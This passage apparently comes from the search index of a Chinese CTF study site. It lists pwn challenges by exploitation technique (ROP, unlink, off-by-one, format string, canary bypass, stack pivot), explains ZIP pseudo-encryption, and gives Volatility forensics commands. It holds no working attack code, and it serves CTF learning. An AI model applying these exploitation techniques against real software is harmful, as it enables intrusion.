\u6ce8\uff1a\u672c\u5730\u53ef\u53ea\u7528\u6808\u6ea2\u51fa\u3001\u8fdc\u7a0b\u9700\u8981\u914d\u5408mprotect 2017 \u6e56\u6e58\u676f pwn300 \u9a9a\u4e1c\u897f \u00b6 pwnable_orw \u8003 \u70b9\uff1aseccomp\u6c99\u7bb1\u3001shellcode \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU bjdctf_2020_router \u8003 \u70b9\uff1alinux \u591a\u6307\u4ee4\u6267\u884c \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU jarvisoj_level1 \u8003 \u70b9\uff1alinux \u591a\u6307\u4ee4\u6267\u884c \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU \u5907 \u6ce8\uff1a\u672c\u5730\u53ef\u53ea\u5199shellcode\u3001\u8fdc\u7a0b\u9700\u8981ret2libc 2020_ciscn_babyjsc \u8003 \u70b9\uff1apython2 input \u547d\u4ee4\u6267\u884c \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aGithub \u5907 \u6ce8\uff1a","title":"\u77e5\u8bc6\u70b9&\u9898\u76ee\u7d22\u5f15"},{"location":"KnowExam/Know%26Exam/#_1","text":"","title":"\u77e5\u8bc6\u70b9&amp;\u9898\u76ee\u7d22\u5f15"},{"location":"KnowExam/Know%26Exam/#unlink","text":"2016 ZCTF note2 \u8003 \u70b9\uff1aunlink\u3001\u7c7b\u578b\u8f6c\u6362 \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU 2014 HITCON stkof Asis CTF 2016 b00ks \u8003 \u70b9\uff1aunlink \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU","title":"unlink"},{"location":"KnowExam/Know%26Exam/#extendoverlapping","text":"HITCON Trainging lab13 \u8003 \u70b9\uff1aoff-by-one \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU 2015 hacklu bookstore \u8003 \u70b9\uff1aoff-by-one\u3001UAF\u3001\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u3001hijack fini_array \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU","title":"extend&amp;overlapping"},{"location":"KnowExam/Know%26Exam/#off-by-one","text":"Asis CTF 2016 b00ks \u8003 \u70b9\uff1aoff-by-one\uff08\u3001unlink\uff09 \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU \u5907 \u6ce8\uff1a16\u7528unlink\u505a\uff0c18\u7528off-by-one\u505a","title":"off-by-one"},{"location":"KnowExam/Know%26Exam/#_2","text":"bjdctf_2020_babystack2 \u8003 \u70b9\uff1a\u6574\u6570\u6ea2\u51fa \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU pwn2_sctf_2016 \u8003 \u70b9\uff1a\u6574\u6570\u6ea2\u51fa\u3001ROP \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU","title":"\u6574\u6570\u6ea2\u51fa"},{"location":"KnowExam/Know%26Exam/#rop","text":"jarvisoj_level3 jarvisoj_tell_me_something jarvisoj_level4 bjdctf_2020_babyrop jarvisoj_test_your_memory PicoCTF_2018_rop_chain \u8003 \u70b9\uff1a\u7b80\u5355ROP \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU ez_pz_hackover_2016 \u8003 \u70b9\uff1a\u7b80\u5355ROP\u3001strcmp \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU \u94c1\u4eba\u4e09\u9879(\u7b2c\u4e94\u8d5b\u533a)_2018_rop jarvisoj_level1 \u8003 \u70b9\uff1a\u7b80\u5355ROP\u3001write \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU bjdctf_2020_babyrop2 \u8003 \u70b9\uff1aret2libc\u3001\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7ed5\u8fc7canary \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU jarvisoj_level3_x64 \u8003 \u70b9\uff1aret2csu\u3001write \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU pwnable.tw-3x17 DASCTF\u4e94\u6708\u8d5b-Memory Monster II \u8003 \u70b9\uff1a64\u4f4d\u52ab\u6301 fini_array\u8fdb\u884cROP \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1apwnable.tw\u3001github","title":"ROP\uff08\u6808\u6ea2\u51fa\uff09"},{"location":"KnowExam/Know%26Exam/#_3","text":"gyctf_2020_borrowstack \u8003 \u70b9\uff1a\u6808\u8fc1\u79fb\u3001onegedget \u505a\u9898\u7b14\u8bb0\uff1a https://www.mrskye.cn/archives/14/ \u5b9e\u9a8c\u73af\u5883\uff1aBUU \u5907 \u6ce8\uff1a\u6d4b\u8bd5\u4e0d\u80fd\u4f7f\u7528system('/bin/sh')\uff0c\u7a7a\u95f4\u4e0d\u8db3\uff0c\u8be6\u7ec6\u770bwp [Black Watch \u5165\u7fa4\u9898]PWN-spwn \u8003 \u70b9\uff1a\u6808\u8fc1\u79fb \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU \u5907 \u6ce8\uff1a\u8fd9\u6761\u9898\u76ee\u6ce8\u610f puts \u548c write \u6240\u9700\u6808\u7a7a\u95f4\u7684\u5927\u5c0f\u4e0e\u5199\u5165 bss \u7684\u4f4d\u7f6e\u5173\u7cfb ciscn_2019_es_2 \u8003 \u70b9\uff1a\u7b80\u5355\u6808\u8fc1\u79fb \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU \u5907 \u6ce8\uff1a\u6ce8\u610f /bin/sh \u5199\u5165\u4f4d\u7f6e\u4e0e\u6808\u751f\u957f\u65b9\u5411","title":"\u6808\u8fc1\u79fb"},{"location":"KnowExam/Know%26Exam/#_4","text":"jarvisoj_fm \u8003 \u70b9\uff1a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u3001\u4efb\u610f\u5730\u5740\u5c0f\u6570\u5b57\u8986\u76d6 \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU \u5907 \u6ce8\uff1a\u53ef\u4ee5\u601d\u8003\u4e00\u4e0b\u5982\u679c\u8981\u6c42\u8986\u76d6\u7684\u662f 1 \u600e\u4e48\u6784\u9020 [RACTF]Finches in a Stack \u8003 \u70b9\uff1a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u3001\u7ed5\u8fc7 canary \u505a\u9898\u7b14\u8bb0\uff1a https://www.mrskye.cn/archives/138/#FinchesinaStack \u5b9e\u9a8c\u73af\u5883\uff1a \u5907 \u6ce8\uff1a\u539f\u9898\u4e3a Ubuntu18\uff0c\u6709\u540e\u95e8 [RACTF]Finches in a Pie \u8003 \u70b9\uff1a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u3001\u7ed5\u8fc7 canary \u3001PIE \u505a\u9898\u7b14\u8bb0\uff1a https://www.mrskye.cn/archives/138/#FinchesinaStack \u5b9e\u9a8c\u73af\u5883\uff1a \u5907 \u6ce8\uff1a\u539f\u9898\u4e3a Ubuntu18\uff0c\u6709\u540e\u95e8 [BJDCTF 2 nd ]r2t4 \u8003 \u70b9\uff1a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u3001__stack_chk_fail \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU \u5907 \u6ce8\uff1a\u4e0e\u6b63\u5e38\u7ed5\u8fc7 canary \u4e0d\u540c\u7684\u662f\uff0c\u6545\u610f\u89e6\u53d1\u62a5\u9519\uff1b\u7559\u6709\u540e\u95e8\uff0c\u96be\u5ea6\u4f4e\u4e8e redpwn2020 dead-canary redpwn2020 dead-canary \u8003 \u70b9\uff1a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u3001__stack_chk_fail \u505a\u9898\u7b14\u8bb0\uff1a redpwnCTF 2020 pwn\u90e8\u5206writeup \u5b9e\u9a8c\u73af\u5883\uff1a github \u5907 \u6ce8\uff1a\u4e0e[BJDCTF 2 nd ]r2t4\u4e00\u6837\u4e3b\u52a8\u89e6\u53d1 canary \uff0c\u6ca1\u6709\u7559\u540e\u95e8\uff0c\u9700\u8981\u81ea\u5df1\u6784\u5efa ROP \u94fe\uff08\u5982\u679c\u7528onegadget\u4e0d\u9700\u8981 ROP\uff09 DASCTF\u4e03\u6708 \u865a\u5047\u7684\u7b7e\u5230\u9898 \u8003 \u70b9\uff1a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32 \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1a \u5907 \u6ce8\uff1a\u9898\u76ee\u4e0d\u80fd\u7528\u5e38\u89c4\u7684\u6808\u6ea2\u51fa\u89e3\u51b3\uff0c\u7a0b\u5e8f\u9000\u51fa\u65f6leave\u540e\u9762\u52a0\u4e86\u4e00\u6761\u989d\u5916\u6c47\u7f16\u6307\u4ee4\uff0c\u4f1a\u4fee\u6539\u6808\u9876\u3002\u601d\u8def\u5e94\u8be5\u662f\u4fee\u6539puts@got\u4e3a\u540e\u95e8\u5730\u5740\u3002","title":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32"},{"location":"KnowExam/Know%26Exam/#_5","text":"cmcc_simplerop \u8003 \u70b9\uff1a\u7cfb\u7edf\u8c03\u7528\u53f7\u3001\u7b80\u5355\u6808\u6ea2\u51fa \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU get_started_3dsctf_2016 \u8003 \u70b9\uff1amprotect\u6539\u5185\u5b58\u6743\u9650\u3001\u7b80\u5355\u6808\u6ea2\u51fa \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU \u5907 \u6ce8\uff1a\u672c\u5730\u53ef\u53ea\u7528\u6808\u6ea2\u51fa\u3001\u8fdc\u7a0b\u9700\u8981\u914d\u5408mprotect 2017 \u6e56\u6e58\u676f pwn300","title":"\u9759\u6001\u7f16\u8bd1"},{"location":"KnowExam/Know%26Exam/#_6","text":"pwnable_orw \u8003 \u70b9\uff1aseccomp\u6c99\u7bb1\u3001shellcode \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU bjdctf_2020_router \u8003 \u70b9\uff1alinux \u591a\u6307\u4ee4\u6267\u884c \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU jarvisoj_level1 \u8003 \u70b9\uff1alinux \u591a\u6307\u4ee4\u6267\u884c \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aBUU \u5907 \u6ce8\uff1a\u672c\u5730\u53ef\u53ea\u5199shellcode\u3001\u8fdc\u7a0b\u9700\u8981ret2libc 2020_ciscn_babyjsc \u8003 \u70b9\uff1apython2 input \u547d\u4ee4\u6267\u884c \u505a\u9898\u7b14\u8bb0\uff1a \u5b9e\u9a8c\u73af\u5883\uff1aGithub \u5907 \u6ce8\uff1a","title":"\u9a9a\u4e1c\u897f"},{"location":"Misc/ZIP%E5%8E%8B%E7%BC%A9%E5%8C%85%E4%BC%AA%E5%8A%A0%E5%AF%86/","text":"ZIP\u538b\u7f29\u5305\u4f2a\u52a0\u5bc6 \u00b6 \u524d\u7f6e\u77e5\u8bc6 \u00b6 a aa aaa ZIP\u6587\u4ef6\u768416\u8fdb\u5236\u6587\u4ef6\u53ef\u4ee5\u5206\u4e3a**\u538b\u7f29\u6e90\u6587\u4ef6\u6570\u636e\u533a**\u3001 \u538b\u7f29\u6e90\u6587\u4ef6\u76ee\u5f55\u533a \u3001 \u538b\u7f29\u6e90\u6587\u4ef6\u76ee\u5f55\u7ed3\u675f\u6807\u5fd7 \u3002 \u6bcf\u4e2a\u533a\u90fd\u6709\u5bf9\u5e94\u7684\u6587\u4ef6\u5934\u6807\u8bb0\uff0c\u7ed3\u5408\u5b9e\u964516\u8fdb\u5236\u6587\u4ef6\u6765\u89e3\u91ca\u5404\u533a\u7684\u6587\u4ef6\u5934\u4fe1\u606f\u3002 \u538b\u7f29\u6e90\u6587\u4ef6\u6570\u636e\u533a \u00b6 16\u8fdb\u5236\u6587\u4ef6\u6570\u636e \u63cf\u8ff0 50 4B 03 04 zip\u7c7b\u578b\u5934\u6587\u4ef6\u6807\u8bc6 14 00 \u89e3\u538b\u6587\u4ef6\u6240\u9700\u8981pkware\u7248\u672c 00 00 \u5168\u5c40\u65b9\u5f0f\u4f4d\u6807\u8bb0\uff08\u6709\u65e0\u52a0\u5bc6\uff09 08 00 \u538b\u7f29\u65b9\u5f0f 70 02 \u6700\u540e\u4fee\u6539\u6587\u4ef6\u65f6\u95f4 01 4B \u6700\u540e\u4fee\u6539\u6587\u4ef6\u65e5\u671f B7 EF DC 83 CRC-32\u6821\u9a8c\uff081480B516\uff09 03 00 00 00 \u538b\u7f29\u540e\u5c3a\u5bf8\uff083B\uff09 01 00 00 00 \u672a\u538b\u7f29\u5c3a\u5bf8\uff0823\uff09 05 00 \u6587\u4ef6\u540d\u957f\u5ea6 00 00 \u6269\u5c55\u8bb0\u5f55\u957f\u5ea6 \u538b\u7f29\u6e90\u6587\u4ef6\u76ee\u5f55\u533a \u00b6 16\u8fdb\u5236\u6587\u4ef6\u6570\u636e \u63cf\u8ff0 50 4B 01 02 \u76ee\u5f55\u4e2d\u6587\u4ef6\u6587\u4ef6\u5934\u6807\u8bb0 1F 00 \u538b\u7f29\u4f7f\u7528\u7684 pkware \u7248\u672c 14 00 \u89e3\u538b\u6587\u4ef6\u6240\u9700 pkware \u7248\u672c 00 00 \u5168\u5c40\u65b9\u5f0f\u4f4d\u6807\u8bb0\uff08\u6709\u65e0\u52a0\u5bc6\uff09 08 00 \u538b\u7f29\u65b9\u5f0f 70 02 \u6700\u540e\u4fee\u6539\u6587\u4ef6\u65f6\u95f4 01 4B \u6700\u540e\u4fee\u6539\u6587\u4ef6\u65e5\u671f B7 EF DC 83 CRC-32\u6821\u9a8c\uff081480B516\uff09 \u538b\u7f29\u6e90\u6587\u4ef6\u76ee\u5f55\u7ed3\u675f\u6807\u5fd7 \u00b6 16\u8fdb\u5236\u6587\u4ef6\u6570\u636e \u63cf\u8ff0 50 4B 05 06 \u76ee\u5f55\u7ed3\u675f\u6807\u5fd7 00 00 \u5f53\u524d\u78c1\u76d8\u53d8\u8584 00 00 \u76ee\u5f55\u533a\u5f00\u59cb\u78c1\u76d8\u7f16\u53f7 01 00 \u672c\u78c1\u76d8\u4e0a\u8bb0\u5f55\u603b\u6570 01 00 \u76ee\u5f55\u533a\u4e2d\u8bb0\u5f55\u603b\u6570 81 00 00 00 \u76ee\u5f55\u533a\u5c3a\u5bf8\u5927\u5c0f 50 00 00 00 \u76ee\u5f55\u533a\u5bf9\u7b2c\u4e00\u5f20\u78c1\u76d8\u7684\u504f\u79fb\u91cf 00 00 ZIP\u6587\u4ef6\u6ce8\u91ca\u957f\u5ea6 \u4f2a\u52a0\u5bc6\u539f\u7406 \u00b6 zip\u4f2a\u52a0\u5bc6\u662f\u5728\u6587\u4ef6\u5934\u7684\u52a0\u5bc6\u6807\u5fd7\u4f4d\u505a\u4fee\u6539\uff0c\u8fdb\u800c\u518d\u6253\u5f00\u6587\u4ef6\u65f6\u8bc6\u88ab\u522b\u4e3a\u52a0\u5bc6\u538b\u7f29\u5305\u3002 \u65e0\u52a0\u5bc6 \u00b6 \u538b\u7f29\u6e90\u6587\u4ef6\u6570\u636e\u533a\u7684\u5168\u5c40\u52a0\u5bc6\u5e94\u5f53\u4e3a 00 00 \u4e14\u538b\u7f29\u6e90\u6587\u4ef6\u76ee\u5f55\u533a\u7684\u5168\u5c40\u65b9\u5f0f\u4f4d\u6807\u8bb0\u5e94\u5f53\u4e3a 00 00 \u4f2a\u52a0\u5bc6 \u00b6 \u538b\u7f29\u6e90\u6587\u4ef6\u6570\u636e\u533a\u7684\u5168\u5c40\u52a0\u5bc6\u5e94\u5f53\u4e3a 00 00 \u4e14\u538b\u7f29\u6e90\u6587\u4ef6\u76ee\u5f55\u533a\u7684\u5168\u5c40\u65b9\u5f0f\u4f4d\u6807\u8bb0\u5e94\u5f53\u4e3a 09 00 \u771f\u52a0\u5bc6 \u00b6 \u538b\u7f29\u6e90\u6587\u4ef6\u6570\u636e\u533a\u7684\u5168\u5c40\u52a0\u5bc6\u5e94\u5f53\u4e3a 09 00 \u4e14\u538b\u7f29\u6e90\u6587\u4ef6\u76ee\u5f55\u533a\u7684\u5168\u5c40\u65b9\u5f0f\u4f4d\u6807\u8bb0\u5e94\u5f53\u4e3a 09 00 \u793a\u4f8b \u00b6 \u65b0\u5efa\u4e00\u4e2a\u6587\u4ef6\uff0c\u538b\u7f29\u4e3a\u4e00\u4e2a\u65e0\u5bc6\u7801\u7684\u540e\u7f00\u540d\u4e3azip\u7684\u5305\u3002 \u7528winhex\u6253\u5f00\u627e\u5230**\u538b\u7f29\u6e90\u6587\u4ef6\u76ee\u5f55\u533a**\uff0c\u627e\u5230\u5168\u5c40\u65b9\u5f0f\u4f4d\u4fee\u6539\u4e3a 09 00 \u3002\u5c1d\u8bd5\u89e3\u538b\u6587\u4ef6\u4f1a\u63d0\u793a\u8f93\u5165\u79d8\u5bc6\u3002 \u53c2\u8003 \u00b6 zip\u4f2a\u52a0\u5bc6 [CTF]zip\u4f2a\u52a0\u5bc6","title":"ZIP\u538b\u7f29\u5305\u4f2a\u52a0\u5bc6"},{"location":"Misc/ZIP%E5%8E%8B%E7%BC%A9%E5%8C%85%E4%BC%AA%E5%8A%A0%E5%AF%86/#zip","text":"","title":"ZIP\u538b\u7f29\u5305\u4f2a\u52a0\u5bc6"},{"location":"Misc/ZIP%E5%8E%8B%E7%BC%A9%E5%8C%85%E4%BC%AA%E5%8A%A0%E5%AF%86/#_1","text":"a aa aaa ZIP\u6587\u4ef6\u768416\u8fdb\u5236\u6587\u4ef6\u53ef\u4ee5\u5206\u4e3a**\u538b\u7f29\u6e90\u6587\u4ef6\u6570\u636e\u533a**\u3001 \u538b\u7f29\u6e90\u6587\u4ef6\u76ee\u5f55\u533a \u3001 \u538b\u7f29\u6e90\u6587\u4ef6\u76ee\u5f55\u7ed3\u675f\u6807\u5fd7 \u3002 \u6bcf\u4e2a\u533a\u90fd\u6709\u5bf9\u5e94\u7684\u6587\u4ef6\u5934\u6807\u8bb0\uff0c\u7ed3\u5408\u5b9e\u964516\u8fdb\u5236\u6587\u4ef6\u6765\u89e3\u91ca\u5404\u533a\u7684\u6587\u4ef6\u5934\u4fe1\u606f\u3002","title":"\u524d\u7f6e\u77e5\u8bc6"},{"location":"Misc/ZIP%E5%8E%8B%E7%BC%A9%E5%8C%85%E4%BC%AA%E5%8A%A0%E5%AF%86/#_2","text":"16\u8fdb\u5236\u6587\u4ef6\u6570\u636e \u63cf\u8ff0 50 4B 03 04 zip\u7c7b\u578b\u5934\u6587\u4ef6\u6807\u8bc6 14 00 \u89e3\u538b\u6587\u4ef6\u6240\u9700\u8981pkware\u7248\u672c 00 00 \u5168\u5c40\u65b9\u5f0f\u4f4d\u6807\u8bb0\uff08\u6709\u65e0\u52a0\u5bc6\uff09 08 00 \u538b\u7f29\u65b9\u5f0f 70 02 \u6700\u540e\u4fee\u6539\u6587\u4ef6\u65f6\u95f4 01 4B \u6700\u540e\u4fee\u6539\u6587\u4ef6\u65e5\u671f B7 EF DC 83 CRC-32\u6821\u9a8c\uff081480B516\uff09 03 00 00 00 \u538b\u7f29\u540e\u5c3a\u5bf8\uff083B\uff09 01 00 00 00 \u672a\u538b\u7f29\u5c3a\u5bf8\uff0823\uff09 05 00 \u6587\u4ef6\u540d\u957f\u5ea6 00 00 \u6269\u5c55\u8bb0\u5f55\u957f\u5ea6","title":"\u538b\u7f29\u6e90\u6587\u4ef6\u6570\u636e\u533a"},{"location":"Misc/ZIP%E5%8E%8B%E7%BC%A9%E5%8C%85%E4%BC%AA%E5%8A%A0%E5%AF%86/#_3","text":"16\u8fdb\u5236\u6587\u4ef6\u6570\u636e \u63cf\u8ff0 50 4B 01 02 \u76ee\u5f55\u4e2d\u6587\u4ef6\u6587\u4ef6\u5934\u6807\u8bb0 1F 00 \u538b\u7f29\u4f7f\u7528\u7684 pkware \u7248\u672c 14 00 \u89e3\u538b\u6587\u4ef6\u6240\u9700 pkware \u7248\u672c 00 00 \u5168\u5c40\u65b9\u5f0f\u4f4d\u6807\u8bb0\uff08\u6709\u65e0\u52a0\u5bc6\uff09 08 00 \u538b\u7f29\u65b9\u5f0f 70 02 \u6700\u540e\u4fee\u6539\u6587\u4ef6\u65f6\u95f4 01 4B \u6700\u540e\u4fee\u6539\u6587\u4ef6\u65e5\u671f B7 EF DC 83 CRC-32\u6821\u9a8c\uff081480B516\uff09","title":"\u538b\u7f29\u6e90\u6587\u4ef6\u76ee\u5f55\u533a"},{"location":"Misc/ZIP%E5%8E%8B%E7%BC%A9%E5%8C%85%E4%BC%AA%E5%8A%A0%E5%AF%86/#_4","text":"16\u8fdb\u5236\u6587\u4ef6\u6570\u636e \u63cf\u8ff0 50 4B 05 06 \u76ee\u5f55\u7ed3\u675f\u6807\u5fd7 00 00 \u5f53\u524d\u78c1\u76d8\u53d8\u8584 00 00 \u76ee\u5f55\u533a\u5f00\u59cb\u78c1\u76d8\u7f16\u53f7 01 00 \u672c\u78c1\u76d8\u4e0a\u8bb0\u5f55\u603b\u6570 01 00 \u76ee\u5f55\u533a\u4e2d\u8bb0\u5f55\u603b\u6570 81 00 00 00 \u76ee\u5f55\u533a\u5c3a\u5bf8\u5927\u5c0f 50 00 00 00 \u76ee\u5f55\u533a\u5bf9\u7b2c\u4e00\u5f20\u78c1\u76d8\u7684\u504f\u79fb\u91cf 00 00 ZIP\u6587\u4ef6\u6ce8\u91ca\u957f\u5ea6","title":"\u538b\u7f29\u6e90\u6587\u4ef6\u76ee\u5f55\u7ed3\u675f\u6807\u5fd7"},{"location":"Misc/ZIP%E5%8E%8B%E7%BC%A9%E5%8C%85%E4%BC%AA%E5%8A%A0%E5%AF%86/#_5","text":"zip\u4f2a\u52a0\u5bc6\u662f\u5728\u6587\u4ef6\u5934\u7684\u52a0\u5bc6\u6807\u5fd7\u4f4d\u505a\u4fee\u6539\uff0c\u8fdb\u800c\u518d\u6253\u5f00\u6587\u4ef6\u65f6\u8bc6\u88ab\u522b\u4e3a\u52a0\u5bc6\u538b\u7f29\u5305\u3002","title":"\u4f2a\u52a0\u5bc6\u539f\u7406"},{"location":"Misc/ZIP%E5%8E%8B%E7%BC%A9%E5%8C%85%E4%BC%AA%E5%8A%A0%E5%AF%86/#_6","text":"\u538b\u7f29\u6e90\u6587\u4ef6\u6570\u636e\u533a\u7684\u5168\u5c40\u52a0\u5bc6\u5e94\u5f53\u4e3a 00 00 \u4e14\u538b\u7f29\u6e90\u6587\u4ef6\u76ee\u5f55\u533a\u7684\u5168\u5c40\u65b9\u5f0f\u4f4d\u6807\u8bb0\u5e94\u5f53\u4e3a 00 00","title":"\u65e0\u52a0\u5bc6"},{"location":"Misc/ZIP%E5%8E%8B%E7%BC%A9%E5%8C%85%E4%BC%AA%E5%8A%A0%E5%AF%86/#_7","text":"\u538b\u7f29\u6e90\u6587\u4ef6\u6570\u636e\u533a\u7684\u5168\u5c40\u52a0\u5bc6\u5e94\u5f53\u4e3a 00 00 \u4e14\u538b\u7f29\u6e90\u6587\u4ef6\u76ee\u5f55\u533a\u7684\u5168\u5c40\u65b9\u5f0f\u4f4d\u6807\u8bb0\u5e94\u5f53\u4e3a 09 00","title":"\u4f2a\u52a0\u5bc6"},{"location":"Misc/ZIP%E5%8E%8B%E7%BC%A9%E5%8C%85%E4%BC%AA%E5%8A%A0%E5%AF%86/#_8","text":"\u538b\u7f29\u6e90\u6587\u4ef6\u6570\u636e\u533a\u7684\u5168\u5c40\u52a0\u5bc6\u5e94\u5f53\u4e3a 09 00 \u4e14\u538b\u7f29\u6e90\u6587\u4ef6\u76ee\u5f55\u533a\u7684\u5168\u5c40\u65b9\u5f0f\u4f4d\u6807\u8bb0\u5e94\u5f53\u4e3a 09 00","title":"\u771f\u52a0\u5bc6"},{"location":"Misc/ZIP%E5%8E%8B%E7%BC%A9%E5%8C%85%E4%BC%AA%E5%8A%A0%E5%AF%86/#_9","text":"\u65b0\u5efa\u4e00\u4e2a\u6587\u4ef6\uff0c\u538b\u7f29\u4e3a\u4e00\u4e2a\u65e0\u5bc6\u7801\u7684\u540e\u7f00\u540d\u4e3azip\u7684\u5305\u3002 \u7528winhex\u6253\u5f00\u627e\u5230**\u538b\u7f29\u6e90\u6587\u4ef6\u76ee\u5f55\u533a**\uff0c\u627e\u5230\u5168\u5c40\u65b9\u5f0f\u4f4d\u4fee\u6539\u4e3a 09 00 \u3002\u5c1d\u8bd5\u89e3\u538b\u6587\u4ef6\u4f1a\u63d0\u793a\u8f93\u5165\u79d8\u5bc6\u3002","title":"\u793a\u4f8b"},{"location":"Misc/ZIP%E5%8E%8B%E7%BC%A9%E5%8C%85%E4%BC%AA%E5%8A%A0%E5%AF%86/#_10","text":"zip\u4f2a\u52a0\u5bc6 [CTF]zip\u4f2a\u52a0\u5bc6","title":"\u53c2\u8003"},{"location":"Misc/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81-volatility/","text":"\u5185\u5b58\u53d6\u8bc1-volatility \u00b6 \u5b89\u88c5 \u00b6 \u5b9e\u6d4bkali 7.x\u81ea\u5e26\uff0c\u800c\u6700\u65b0\u7684kali 9.x\u6ca1\u6709 \u4f7f\u7528 \u00b6 \u5224\u65ad\u955c\u50cf\u4fe1\u606f\uff0c\u83b7\u53d6\u64cd\u4f5c\u7cfb\u7edf\u7c7b\u578b volatility -f ?.img/raw/... imageinfo \u77e5\u9053\u64cd\u4f5c\u7cfb\u7edf\u7c7b\u578b\u540e\uff0c\u7528 --profile \u6307\u5b9a\u7cfb\u7edf\u7684\u64cd\u4f5c\u7c7b\u578b volatility -f ?.img --profile=... \u67e5\u770b\u5f53\u524d\u663e\u793a\u7684notepad\u6587\u672c\uff08\u63d0\u53d6\u67d0\u4e2a\u7a0b\u5e8f\uff09 volatility -f file.raw --profile=WinXPSP2x86 notepad \u67e5\u770b\u5f53\u524d\u8fd0\u884c\u7684\u8fdb\u7a0b volatility -f file.raw --profile=WinXPSP2x86 psscan/pslist \u626b\u63cf\u6240\u6709\u7684\u6587\u4ef6\u5217\u8868(\u5e38\u5e38\u7ed3\u5408grep\uff0c\u5373\u6b63\u5219) volatility -f file.raw --profile=WinXPSP2x86 filescan \u6839\u636eoffset\u63d0\u53d6\u51fa\u6587\u4ef6 volatility -f file.raw --profile=WinXPSP2x86 dumpfiles -D . -Q 0x..... \u626b\u63cf Windows \u7684\u670d\u52a1 volatility -f file.raw --profile=WinXPSP2x86 svcscan \u67e5\u770b\u7f51\u7edc\u8fde\u63a5 volatility -f file.raw --profile=WinXPSP2x86 connscan \u67e5\u770b\u547d\u4ee4\u884c\u4e0a\u7684\u64cd\u4f5c volatility -f file.raw --profile=WinXPSP2x86 cmdscan \u6839\u636epid dump\u51fa\u76f8\u5e94\u7684\u8fdb\u7a0b volatility -f easy_dump.img --profile=Win7SP1x64 memdump -p 2580 -D \u76ee\u5f55 \u53c2\u8003 \u00b6 \u5185\u5b58\u53d6\u8bc1\u4e4b\u65c5 \u5185\u5b58\u53d6\u8bc1\u5de5\u5177volatility\u7528\u6cd5\u4e0e\u5b9e\u6218 \uff08ps:\u8fd9\u4e2a\u542b\u624b\u52a8\u5b89\u88c5\uff09","title":"\u5185\u5b58\u53d6\u8bc1-volatility"},{"location":"Misc/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81-volatility/#-volatility","text":"","title":"\u5185\u5b58\u53d6\u8bc1-volatility"},{"location":"Misc/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81-volatility/#_1","text":"\u5b9e\u6d4bkali 7.x\u81ea\u5e26\uff0c\u800c\u6700\u65b0\u7684kali 9.x\u6ca1\u6709","title":"\u5b89\u88c5"},{"location":"Misc/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81-volatility/#_2","text":"\u5224\u65ad\u955c\u50cf\u4fe1\u606f\uff0c\u83b7\u53d6\u64cd\u4f5c\u7cfb\u7edf\u7c7b\u578b volatility -f ?.img/raw/... imageinfo \u77e5\u9053\u64cd\u4f5c\u7cfb\u7edf\u7c7b\u578b\u540e\uff0c\u7528 --profile \u6307\u5b9a\u7cfb\u7edf\u7684\u64cd\u4f5c\u7c7b\u578b volatility -f ?.img --profile=... \u67e5\u770b\u5f53\u524d\u663e\u793a\u7684notepad\u6587\u672c\uff08\u63d0\u53d6\u67d0\u4e2a\u7a0b\u5e8f\uff09 volatility -f file.raw --profile=WinXPSP2x86 notepad \u67e5\u770b\u5f53\u524d\u8fd0\u884c\u7684\u8fdb\u7a0b volatility -f file.raw --profile=WinXPSP2x86 psscan/pslist 